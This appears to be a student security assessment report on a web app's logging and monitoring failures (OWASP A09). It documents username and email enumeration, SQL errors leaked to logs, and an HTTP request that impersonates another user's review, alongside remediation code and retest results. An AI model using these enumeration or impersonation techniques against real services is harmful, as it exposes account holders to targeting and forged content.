**Author:** Nachiketh Reddy Y

## Finding 14 — Security Logging & Monitoring Failures

### 1. Vulnerability & Type of Flaw

**Type:** OWASP A09 | **CVSS 3.1:** 7.5 (High)

No audit logging; `console.log(err)` SQL leakage; username/email enumeration; unlogged review impersonation. Token logging removed under A01.

### 2. Exploitation

### Step 1 — No audit trail on registration

An admin registers a user via `POST /users`. The backend terminal showed only the startup banner — no timestamp, actor, or action recorded.

![Figure 1 — Backend terminal after registration: no audit entry](../../Assets/Nachiketh/a09/24%20terminal.png)

![Figure 2 — Bruno: registration request succeeded (201)](../../Assets/Nachiketh/a09/24.png)

**What this proves:** A successful account-creation event is invisible in logs. An attacker creating backdoor accounts would leave no structured evidence for incident response.

---

### Step 2 — SQL error details leaked to console

A malformed `POST /game` request triggered a database error. The full `ER_*` message with column names appeared in stdout via `console.log(err)`.

![Figure 3 — Backend terminal: raw SQL error exposed](../../Assets/Nachiketh/a09/25%20error.png)

![Figure 4 — Bruno: request that triggered the SQL error](../../Assets/Nachiketh/a09/25.png)

**What this proves:** Error handlers acted as an information-disclosure channel. Attackers probing input validation learn table and column names from log output.

---

### Step 3 — Username enumeration

Registering with an existing username returned a specific message revealing the account exists.

![Figure 5 — Bruno: username already exists (enumeration)](../../Assets/Nachiketh/a09/username%20dupe.png)

![Figure 6 — Bruno: alternate capture (request 20)](../../Assets/Nachiketh/a09/20.png)

---

### Step 4 — Email enumeration

Registering with an existing email returned a **different** message — confirming the email is registered even when the username was new.

![Figure 7 — Bruno: email already exists (enumeration)](../../Assets/Nachiketh/a09/email%20dupe.png)

![Figure 8 — Bruno: alternate capture (request 21)](../../Assets/Nachiketh/a09/21.png)

**Enumeration contrast:** The two distinct responses form a decision tree. An attacker cycles through candidate emails or usernames and maps which accounts exist in `users`.

---

### Step 5 — New-user contrast

Registering a brand-new username and email returned yet another response shape — proving attackers can distinguish "exists" from "new".

![Figure 9 — Bruno: new user contrast (request 22)](../../Assets/Nachiketh/a09/22.png)

---

### Step 6 — Review impersonation without audit trail

An authenticated customer (Terry) posted a review attributed to another user's ID in the URL path. The server accepted the request and wrote the review — with no audit entry recording the mismatch.

![Figure 10 — Bruno: review posted as another user (request 15)](../../Assets/Nachiketh/a09/15.png)

**Attack flow:**

```http
POST /users/3/game/12/review HTTP/1.1
Host: localhost:8081
Authorization: Bearer <Terry's token>
Content-Type: application/json

{"content":"Fake review from Terry posing as user 3","rating":1}
```

Terry's JWT contains `userid: 2` (or similar), but the path says `3`. Before the fix, the server stored `fk_users = 3` with no ownership check and no audit line.

---

### Step 7 — Auth required after A01 fixes

After A01 remediation, A09 re-testing required a valid admin Bearer token on protected routes. The Bruno collection documents the login → copy token → set Collection Auth workflow.

![Figure 11 — Bruno: login and Bearer token setup](../../Assets/Nachiketh/a09/bearer.png)

---

### 3. Database Storage

Logging gaps are application-layer — not stored in MySQL. However, the flaws interact with the database:

| Behaviour | Database impact |
|-----------|-----------------|
| Enumeration responses | Indirectly confirms rows exist in `users` |
| SQL errors in stdout | Reveals `users`, `game`, and related schema details |
| Review impersonation | `review` rows inserted with arbitrary `fk_users` from the URL |

Example of an impersonated review row (conceptual):

| reviewID | fk_users | fk_games | content | rating |
|----------|----------|----------|---------|--------|
| `25` | **`3`** (victim) | `12` | Fake review posted by Terry | `1` |

---

### 4. Affected Code (with Location)

### Raw error logging — `controller/app.js`

`console.log(err)` appeared in error handlers throughout the file (~22 instances), logging full database error objects to stdout.

![Figure 12 — Code: console.log(err) on GET /users error path (lines 226–228)](../../Assets/Nachiketh/a09/code/app%20226-228.png)

![Figure 13 — Code: console.log(err) on duplicate registration paths (lines 268, 278)](../../Assets/Nachiketh/a09/code/app%20268,278.png)

---

### Enumeration error messages — `controller/app.js`

Different client-facing messages revealed whether username, email, category, or platform already existed.

![Figure 14 — Code: username and email enumeration messages (lines 272, 282)](../../Assets/Nachiketh/a09/code/app%20272,%20282.png)

![Figure 15 — Code: category duplicate message (line 359)](../../Assets/Nachiketh/a09/code/app%20359.png)

![Figure 16 — Code: platform duplicate message (line 409)](../../Assets/Nachiketh/a09/code/app%20409.png)

**Before fix (representative):**

```javascript
if (err.code === "ER_DUP_ENTRY") {
    console.log(err);
    res.status(422);
    res.send('{"Message":"Username already exists!"}');  // or email-specific text
}
```

---

### Model-layer logging — `model/users.js`

Error paths and a commented token log line in the login flow.

![Figure 17 — Code: error logging and commented token log (lines 131, 143, 154)](../../Assets/Nachiketh/a09/code/user%20131%20143%20153,154.png)

---

### Token logging — `auth/verifyToken.js` (remediated under A01)

Original code actively logged headers and tokens. A commented `//console.log(token)` remained from the assignment template.

![Figure 18 — Code: commented token log in verifyToken.js (line 17)](../../Assets/Nachiketh/a09/code/verifyTocken%2017.png)

Active header/token logging was removed during A01 hardening. The commented line is a reminder that debug logging near auth code is high risk.

---

### 5. Recommendations & Fix Code

A multi-layered approach addresses detection, disclosure, and authorisation gaps.

### Fix 1 — Structured audit logging and safe errors (`securityLog.js`)

```javascript
function audit(action, detail) {
    console.log(JSON.stringify({
        ts: new Date().toISOString(),
        level: 'audit',
        action: action,
        detail: detail || {}
    }));
}

function safeError(err) {
    var message = (err && err.message) ? err.message : String(err);
    console.error(JSON.stringify({
        ts: new Date().toISOString(),
        level: 'error',
        message: message
    }));
}
```

Every `console.log(err)` in controllers and models was replaced with `safeError(err)`. Security events call `audit()`:

| Event | Audit action |
|-------|--------------|
| User registered | `user_registered` |
| Login success / failure | `login_success` / `login_failed` |
| Game deleted | `game_deleted` |
| Review created | `review_created` |
| Review denied (impersonation) | `review_denied` |

### Fix 2 — Generic duplicate message (prevents enumeration)

```javascript
var DUPLICATE_MSG = '{"Message":"The requested resource already exists."}';

if (err.code === "ER_DUP_ENTRY") {
    safeError(err);
    res.status(422);
    res.send(DUPLICATE_MSG);
}
```

Username, email, category, and platform duplicates now return the same `422` body.

### Fix 3 — Review ownership check

```javascript
app.post('/users/:uid/game/:gid/review', verifyToken, function (req, res) {
    var userid = req.params.uid;

    if (String(req.userid) !== String(userid)) {
        audit('review_denied', { actor: req.userid, target: userid, gameID: gameID });
        res.status(403);
        return res.json({ auth: false, message: 'Not authorized!' });
    }
    /* ... insert review ... */
});
```

The JWT `userid` claim must match the `:uid` path parameter.

### Fix 4 — Production logging hygiene

- Ship logs to persistent storage (rotating files, ELK, CloudWatch) — stdout alone is lost on restart.
- Never log tokens, passwords, or full request headers.
- Alert on patterns: repeated `login_failed`, bursts of `review_denied`, spikes in `422` duplicates.

---

### 6. Testing Process

### Testing Methodologies

- **Code review:** Traced every `console.log` in `app.js`, model files, and `verifyToken.js`.
- **Manual API testing:** Bruno requests 15, 20–25 with and without Bearer tokens; terminal capture for log output.
- **Git history:** Confirmed `verifyToken` sensitive logging removal in the A01 commit.

### Remediation Results

| Test | Before fix | After fix |
|------|------------|-----------|
| Register user | Silent terminal | JSON audit: `"action":"user_registered"` |
| Login | No structured log | `"action":"login_success"` / `"login_failed"` |
| Duplicate register (username) | `"Username already exists!"` | Generic `422` — same message for email too |
| Duplicate register (email) | `"Email already exists!"` | Same generic `422` |
| SQL error | Full SQL stack in console | JSON `{"level":"error","message":"..."}` only |
| Terry → review as user 3 | `201 Created` | **403** + `review_denied` audit |
| `verifyToken` stdout | Headers/tokens logged (pre-A01) | No sensitive output |

Post-fix screenshots: save to `Assets/Nachiketh/a09-after/` per [postfix-screenshots guide](../guides/postfix-screenshots.md).
### 7. Tools Used

| Tool | Purpose |
|------|---------|
| Bruno API Client | Trigger registration, enumeration, impersonation |
| Backend terminal (stdout) | Observe logging before/after |
| VS Code | Locate logging and enumeration code |
| Git history | Confirm verifyToken fix in A01 commit |


---

# Conclusion

## Master Findings Summary

| # | Finding | OWASP | Author | Severity | Status |
|---|---------|-------|--------|----------|--------|
| 1 | Missing Authentication & Authorisation | A01 | Nachiketh | Critical | Fixed |
| 2 | Plaintext Password Exposure via API | A01 | Nachiketh | Critical | Partially fixed |
| 3 | SQL Injection (access control context) | A01 | Nachiketh | Critical | Fixed |
| 4 | Hardcoded JWT Secret | A01 | Nachiketh | High | Fixed |
| 5 | Frontend-Only Admin Access Control | A04 | Sitt | Critical | Fixed |
| 6 | Client-Controlled Role Assignment | A04 | Sitt | High | Fixed |
| 7 | SQL Injection in GET /users/:userid | A03 | Mike | High | Fixed |
| 8 | SQL Injection in POST /game | A03 | Mike | High | Fixed |
| 9 | SQL Injection in updateGame() | A03 | Mike | Medium | Fixed |
| 10 | Plaintext Password Storage | A07 | Keefe | Critical | Recommended |
| 11 | Hardcoded JWT Secret | A07 | Keefe | High | Fixed |
| 12 | Client-Side Token Storage | A07 | Keefe | Medium | Recommended |
| 13 | Missing HTTPS | A02 | Keefe | High | Recommended |
| 14 | Logging & Monitoring Failures | A09 | Nachiketh | High | Fixed |

## Root Causes

Security controls were absent, client-side, or debug-grade. SQL used interpolation. Secrets and credentials were mishandled. Logging was not monitored.

## Remaining Work

bcrypt hashing, httpOnly cookies, HTTPS/TLS, persistent logs, post-fix screenshots.

---

## Appendix — Evidence Index

| Folder | Files | Topics |
|--------|-------|--------|
| `Assets/Nachiketh/a01/` | 33 | A01 — auth, passwords, SQLi, JWT |
| `Assets/Nachiketh/a09/` | 18 | A09 — logging, enumeration, impersonation |
| `Assets/Mike/` | 5 | A03 — SQL injection PoC and code |
| `Assets/Sitt/a04/` | 6 | A04 — insecure design |
| Keefe (GitHub URLs) | 8 | A07/A02 — auth and crypto |

*End of consolidated report*

